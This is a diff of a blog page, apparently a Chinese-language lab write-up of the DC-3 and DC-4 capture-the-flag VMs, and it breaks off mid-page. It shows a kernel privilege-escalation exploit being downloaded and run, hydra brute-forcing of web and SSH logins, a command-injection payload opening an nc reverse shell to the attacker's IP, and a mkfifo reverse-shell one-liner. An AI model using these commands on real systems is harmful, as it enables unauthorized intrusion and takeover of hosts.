-<p>注意到上面的这个<code>Exploit-DB Mirror</code>，下载这个<code>zip</code>文件到靶机上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">/var/www/html/templates/protostar</span><br><span class="line">$ ls</span><br><span class="line">component.php</span><br><span class="line">css</span><br><span class="line">...</span><br><span class="line">$ mkdir 39772</span><br><span class="line">$ cd 39772</span><br><span class="line">$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">--2019-09-23 16:01:08--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">...</span><br><span class="line">2019-09-23 16:01:10 (4.38 MB/s) - &apos;39772.zip&apos; saved [7025/7025]</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">39772.zip</span><br><span class="line">$ unzip 39772.zip</span><br><span class="line">Archive:  39772.zip</span><br><span class="line">   creating: 39772/</span><br><span class="line">  inflating: 39772/.DS_Store         </span><br><span class="line">   creating: __MACOSX/</span><br><span class="line">   creating: __MACOSX/39772/</span><br><span class="line">  inflating: __MACOSX/39772/._.DS_Store  </span><br><span class="line">  inflating: 39772/crasher.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._crasher.tar  </span><br><span class="line">  inflating: 39772/exploit.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._exploit.tar  </span><br><span class="line">$ ls</span><br><span class="line">39772</span><br><span class="line">39772.zip</span><br><span class="line">__MACOSX</span><br><span class="line">$ cd 39772</span><br><span class="line">$ ls</span><br><span class="line">crasher.tar</span><br><span class="line">exploit.tar</span><br><span class="line">$ tar -xvf exploit.tar</span><br><span class="line">ebpf_mapfd_doubleput_exploit/</span><br><span class="line">ebpf_mapfd_doubleput_exploit/hello.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/suidhelper.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/compile.sh</span><br><span class="line">ebpf_mapfd_doubleput_exploit/doubleput.c</span><br><span class="line">$ ls</span><br><span class="line">crasher.tar</span><br><span class="line">ebpf_mapfd_doubleput_exploit</span><br><span class="line">exploit.tar</span><br><span class="line">$ cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">$ ls</span><br><span class="line">compile.sh</span><br><span class="line">doubleput.c</span><br><span class="line">hello.c</span><br><span class="line">suidhelper.c</span><br><span class="line">$ ./compile.sh</span><br><span class="line">doubleput.c: In function &apos;make_setuid&apos;:</span><br><span class="line">doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .insns = (__aligned_u64) insns,</span><br><span class="line">             ^</span><br><span class="line">doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .license = (__aligned_u64)&quot;&quot;</span><br><span class="line">               ^</span><br><span class="line">$ ls</span><br><span class="line">compile.sh</span><br><span class="line">doubleput</span><br><span class="line">doubleput.c</span><br><span class="line">hello</span><br><span class="line">hello.c</span><br><span class="line">suidhelper</span><br><span class="line">suidhelper.c</span><br><span class="line">$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&apos;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
-<p>执行<code>compile.sh</code>的过程中好像报错了，但是不要紧，还是生成了<code>doubleput</code>，执行后拿到了<code>root</code>权限，拿到了flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls</span><br><span class="line">the-flag.txt</span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| &apos;_ \ / _ \ | | | |</span><br><span class="line">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span><br><span class="line">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Congratulations are in order for completing DC-3VM.  :-)</span><br><span class="line"></span><br><span class="line">I hope you&apos;ve enjoyed this challenge as much as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please let me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br></pre></td></tr></table></figure>
-<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
+<pre><code>root@Knlvre:~# searchsploit -m exploits/linux/local/39772.txt
+  Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/39772
+     Path: /usr/share/exploitdb/exploits/linux/local/39772.txt
+File Type: C source, ASCII text, with CRLF line terminators
+
+Copied to: /root/39772.txt
+</code></pre><p>查看<code>39772.txt</code>可以看到介绍用法</p>
+<pre><code>root@Knlvre:~# tail -20 39772.txt 
+
+An exploit that puts all this together is in exploit.tar. Usage:
+
+user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
+user@host:~/ebpf_mapfd_doubleput$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+root@host:~/ebpf_mapfd_doubleput# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)
+
+This exploit was tested on a Ubuntu 16.04 Desktop system.
+
+Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
+
+
+Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
+Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+</code></pre><p>注意到上面的这个<code>Exploit-DB Mirror</code>，下载这个<code>zip</code>文件到靶机上</p>
+<pre><code>$ pwd
+/var/www/html/templates/protostar
+$ ls
+component.php
+css
+...
+$ mkdir 39772
+$ cd 39772
+$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+--2019-09-23 16:01:08--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+...
+2019-09-23 16:01:10 (4.38 MB/s) - &#39;39772.zip&#39; saved [7025/7025]
+
+$ ls
+39772.zip
+$ unzip 39772.zip
+Archive:  39772.zip
+   creating: 39772/
+  inflating: 39772/.DS_Store         
+   creating: __MACOSX/
+   creating: __MACOSX/39772/
+  inflating: __MACOSX/39772/._.DS_Store  
+  inflating: 39772/crasher.tar       
+  inflating: __MACOSX/39772/._crasher.tar  
+  inflating: 39772/exploit.tar       
+  inflating: __MACOSX/39772/._exploit.tar  
+$ ls
+39772
+39772.zip
+__MACOSX
+$ cd 39772
+$ ls
+crasher.tar
+exploit.tar
+$ tar -xvf exploit.tar
+ebpf_mapfd_doubleput_exploit/
+ebpf_mapfd_doubleput_exploit/hello.c
+ebpf_mapfd_doubleput_exploit/suidhelper.c
+ebpf_mapfd_doubleput_exploit/compile.sh
+ebpf_mapfd_doubleput_exploit/doubleput.c
+$ ls
+crasher.tar
+ebpf_mapfd_doubleput_exploit
+exploit.tar
+$ cd ebpf_mapfd_doubleput_exploit
+$ ls
+compile.sh
+doubleput.c
+hello.c
+suidhelper.c
+$ ./compile.sh
+doubleput.c: In function &#39;make_setuid&#39;:
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)&quot;&quot;
+               ^
+$ ls
+compile.sh
+doubleput
+doubleput.c
+hello
+hello.c
+suidhelper
+suidhelper.c
+$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</code></pre><p>执行<code>compile.sh</code>的过程中好像报错了，但是不要紧，还是生成了<code>doubleput</code>，执行后拿到了<code>root</code>权限，拿到了flag</p>
+<pre><code>cd ~
+ls
+the-flag.txt
+cat the-flag.txt
+ __        __   _ _   ____                   _ _ _ _ 
+ \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
+  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |
+   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
+    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
+
+
+Congratulations are in order for completing DC-3VM.  :-)
+
+I hope you&#39;ve enjoyed this challenge as much as I enjoyed making it.
+
+If there are any ways that I can improve these little challenges,
+please let me know.
+
+As per usual, comments and complaints can be sent via Twitter to @DCAU7
+
+Have a great day!!!!
+</code></pre><h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84）</p>
 <p>靶机：DC-4（IP：192.168.43.193）</p>
 <h2 id="渗透测试-3"><a href="#渗透测试-3" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现开启了<code>22</code>和<code>80</code>端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nmap -p1-65535 -A 192.168.43.193</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 14:20 CST</span><br><span class="line">Nmap scan report for dc-4 (192.168.43.193)</span><br><span class="line">Host is up (0.00069s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:CA:EC:58 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.69 ms dc-4 (192.168.43.193)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds</span><br></pre></td></tr></table></figure>
-<p>访问80端口，是一个登录页面，没有次数、验证码之类的限制</p>
+<pre><code>root@Knlvre:~# nmap -p1-65535 -A 192.168.43.193
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 14:20 CST
+Nmap scan report for dc-4 (192.168.43.193)
+Host is up (0.00069s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
+|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
+|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
+80/tcp open  http    nginx 1.15.10
+|_http-server-header: nginx/1.15.10
+|_http-title: System Tools
+MAC Address: 00:0C:29:CA:EC:58 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.69 ms dc-4 (192.168.43.193)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
+</code></pre><p>访问80端口，是一个登录页面，没有次数、验证码之类的限制</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-1.png" alt="4-1"></p>
 <p>查看源码，<code>hydra</code>爆破</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>System Tools<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/styles.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Admin Information Systems Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">				Username:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">				Password:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/usr/share/wordlists# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.193 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 14:38:45</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking http-post-form://192.168.43.193:80/login.php:username=^USER^&amp;password=^PASS^:S=logout</span><br><span class="line">[80][http-post-form] host: 192.168.43.193   login: admin   password: happy</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 14:39:01</span><br></pre></td></tr></table></figure>
-<p>获得<code>用户名admin - 密码happy</code>。登录之后可以进行3个操作：<code>ls -l、du -h、df -h</code>，可能存在命令执行漏洞</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;System Tools&lt;/title&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;css/styles.css&quot;&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;inner&quot;&gt;
+            &lt;h2&gt;Admin Information Systems Login&lt;/h2&gt;
+            &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;
+                Username:&lt;br&gt;
+                &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot;&gt;&lt;p&gt;
+                Password:&lt;br&gt;
+                &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;&gt;&lt;p&gt;
+                &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+            &lt;/form&gt;
+
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<pre><code>root@Knlvre:/usr/share/wordlists# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.193 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 14:38:45
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.43.193:80/login.php:username=^USER^&amp;password=^PASS^:S=logout
+[80][http-post-form] host: 192.168.43.193   login: admin   password: happy
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 14:39:01
+</code></pre><p>获得<code>用户名admin - 密码happy</code>。登录之后可以进行3个操作：<code>ls -l、du -h、df -h</code>，可能存在命令执行漏洞</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-2.png" alt="4-2"></p>
 <p>抓包，发现可以直接修改要执行的命令并直接执行</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-3.png" alt="4-3"></p>
 <p>现在直接通过<code>nc</code>命令反弹一个shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio=nc -e /bin/sh 192.168.43.84 3737&amp;submit=Run</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-4.png" alt="4-4"></p>
+<pre><code>radio=nc -e /bin/sh 192.168.43.84 3737&amp;submit=Run
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-4.png" alt="4-4"></p>
 <p>如果不支持<code>-e</code>参数，也可以创建远程shell，命令与DC3中一样，但是此处好像不行，到<code>2&gt;</code>处就断了，不再去看</p>
 <p>意义：创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口3737上。至此，我们已经把netcat的输出重定向到fifo文件中。</p>
 <p>说明：从网络收到的输入写到fifo文件中，cat 命令读取fifo文件并且其内容发送给sh命令，sh命令进程受到输入并把它写回到netcat。netcat 通过网络发送输出到client</p>
 <p>至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh 2&gt;&amp;1 | nc 192.168.43.84 3737 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
-<p>回归正题，拿到shell之后，切换到<code>/home</code>目录下，发现有3个用户<code>charles,jim,sam</code>，只有<code>jim</code>目录下有东西，在<code>/home/jim/backups/</code>目录下发现密码文件<code>old-passwords.bak</code>，里面存放着很多密码，除此之外没有其他有用信息。回到上级目录，发现<code>mbox</code>其他人没有权限读，十分可疑。那应该就是要获取<code>jim</code>的密码，ssh登录然后查看了</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh 2&gt;&amp;1 | nc 192.168.43.84 3737 &gt; /tmp/f
+</code></pre><p>回归正题，拿到shell之后，切换到<code>/home</code>目录下，发现有3个用户<code>charles,jim,sam</code>，只有<code>jim</code>目录下有东西，在<code>/home/jim/backups/</code>目录下发现密码文件<code>old-passwords.bak</code>，里面存放着很多密码，除此之外没有其他有用信息。回到上级目录，发现<code>mbox</code>其他人没有权限读，十分可疑。那应该就是要获取<code>jim</code>的密码，ssh登录然后查看了</p>
 <p>将密码文件复制下来写入<code>dc4_passwords.txt</code>，前面扫描端口发现还开放22号端口，那么接下来就用<code>hydra</code>爆破<code>ssh</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# hydra -l jim -P dc4_passwords.txt ssh://192.168.43.193</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 16:10:00</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.43.193:22/</span><br><span class="line">[STATUS] 177.00 tries/min, 177 tries in 00:01h, 76 to do in 00:01h, 16 active</span><br><span class="line">[22][ssh] host: 192.168.43.193   login: jim   password: jibril04</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 1 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 1 target did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 16:11:48</span><br></pre></td></tr></table></figure>
-<p>ssh登录成功，查看mbox</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# ssh jim@192.168.43.193</span><br><span class="line">The authenticity of host &apos;192.168.43.193 (192.168.43.193)&apos; can&apos;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &apos;192.168.43.193&apos; (ECDSA) to the list of known hosts.</span><br><span class="line">jim@192.168.43.193&apos;s password: </span><br><span class="line">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span><br><span class="line"></span><br><span class="line">The programs includ...</span><br><span class="line"></span><br><span class="line">jim@dc-4:~$ ls</span><br><span class="line">backups  mbox  test.sh</span><br><span class="line">jim@dc-4:~$ cat mbox</span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span 